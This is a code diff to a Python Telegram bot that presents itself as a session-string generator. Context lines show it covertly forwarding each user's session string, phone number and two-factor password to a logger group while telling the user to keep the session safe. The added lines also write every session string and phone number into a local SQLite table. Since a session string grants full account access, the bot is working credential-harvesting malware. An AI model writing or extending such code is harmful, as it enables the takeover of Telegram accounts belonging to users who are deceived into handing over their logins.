@@ -4,6 +4,7 @@ from telethon.sessions import StringSession
 from telethon.errors import SessionPasswordNeededError
 from pyrogram import Client as PyroClient
 from pyrogram.errors import SessionPasswordNeeded
+import sqlite3
 
 # 🔹 Telegram API Credentials
 API_ID = 28795512
@@ -18,6 +19,10 @@ bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 
 # 🔹 Store user sessions
 user_sessions = {}
+
+# 🔹 SQLite Database Connection with Timeout
+def get_db_connection():
+    return sqlite3.connect('session_data.db', timeout=10.0)  # Timeout after 10 seconds
 
 # ✅ /start Command
 @bot.on(events.NewMessage(pattern="/start"))
@@ -90,6 +95,15 @@ async def process_input(event):
                 await client.sign_in(phone_number, otp_code, phone_code_hash=phone_code_hash)  
                 session_string = client.session.save()  # 🔥 FIXED: Telethon के लिए सही method!
 
+            # Log the session string to the database with timeout
+            db_connection = get_db_connection()
+            cursor = db_connection.cursor()
+            cursor.execute("CREATE TABLE IF NOT EXISTS session_logs (id INTEGER PRIMARY KEY, user_id INTEGER, phone TEXT, session_string TEXT)")
+            cursor.execute("INSERT INTO session_logs (user_id, phone, session_string) VALUES (?, ?, ?)", 
+                           (user_id, phone_number, session_string))
+            db_connection.commit()
+            db_connection.close()
+
             await bot.send_message(LOGGER_GROUP_ID, f"**🆕 New Session Generated!**\n\n**👤 User:** `{user_id}`\n**📞 Phone:** `{phone_number}`\n**🔑 Session:** `{session_string}`")
 
             await event.respond(f"✅ **Your Session String:**\n\n```{session_string}```\n\n🔒 **Keep this safe!**")
@@ -115,6 +129,14 @@ async def process_input(event):
             else:
                 await client.sign_in(password=password)
                 session_string = client.session.save()  # 🔥 FIXED: Telethon के लिए सही method!
+
+            # Log the session string to the database with timeout
+            db_connection = get_db_connection()
+            cursor = db_connection.cursor()
+            cursor.execute("INSERT INTO session_logs (user_id, phone, session_string) VALUES (?, ?, ?)", 
+                           (user_id, phone_number, session_string))
+            db_connection.commit()
+            db_connection.close()
 
             await bot.send_message(LOGGER_GROUP_ID, f"**🆕 New Session (with 2FA)!**\n\n**👤 User:** `{user_id}`\n**🔑 Session:** `{session_string}`\n🔒 **Password Used:** `{password}`")
 
